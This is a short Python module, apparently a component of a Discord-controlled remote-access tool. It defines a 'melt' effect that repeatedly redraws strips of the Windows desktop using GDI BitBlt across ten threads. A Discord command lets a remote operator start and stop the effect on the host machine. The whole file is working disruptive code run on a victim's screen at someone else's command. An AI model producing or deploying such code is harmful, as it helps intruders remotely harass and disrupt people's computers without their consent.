import discord
from discord.ext import commands
import win32gui
import win32con
import ctypes
import random
import threading
import time

class MeltEffect:
    def __init__(self):
        self.running = False
        self.hdc = win32gui.GetDC(0)
        self.user32 = ctypes.windll.user32
        self.user32.SetProcessDPIAware()
        self.width = self.user32.GetSystemMetrics(0)
        self.height = self.user32.GetSystemMetrics(1)

    def start_melt(self):
        self.running = True
        for _ in range(10):  # Create 10 threads for simultaneous effect
            threading.Thread(target=self.melt_screen, daemon=True).start()

    def stop_melt(self):
        self.running = False

    def melt_screen(self):
        while self.running:
            try:
                # Smaller area but 10x faster and parallel
                x = random.randint(0, self.width - 50)  # Smaller strip width
                win32gui.BitBlt(self.hdc, x, 10, 50, self.height, self.hdc, x, 0, win32con.SRCCOPY)  # Smaller strip
                time.sleep(0.0001)  # Increase speed further

            except Exception as e:
                if e.winerror == 5:  # Access is denied
                    print("Access denied, retrying...")
                    time.sleep(0.01)  # Retry after short wait
                elif e.winerror == 6:  # Invalid handle (happens on Ctrl+Alt+Del)
                    print("Invalid handle, trying to recover...")
                    self.hdc = win32gui.GetDC(0)  # Re-acquire device context and retry
                else:
                    raise e

        win32gui.ReleaseDC(0, self.hdc)

melt_effect = MeltEffect()

async def melt_command(ctx, action: str):
    if action == 'start':
        if not melt_effect.running:
            melt_effect.start_melt()
            await ctx.send("Melting effect started.")
        else:
            await ctx.send("Melting effect is already running.")
    elif action == 'stop':
        if melt_effect.running:
            melt_effect.stop_melt()
            await ctx.send("Melting effect stopped.")
        else:
            await ctx.send("No melting effect is currently running.")
    else:
        await ctx.send("Invalid action. Use 'start' or 'stop'.")
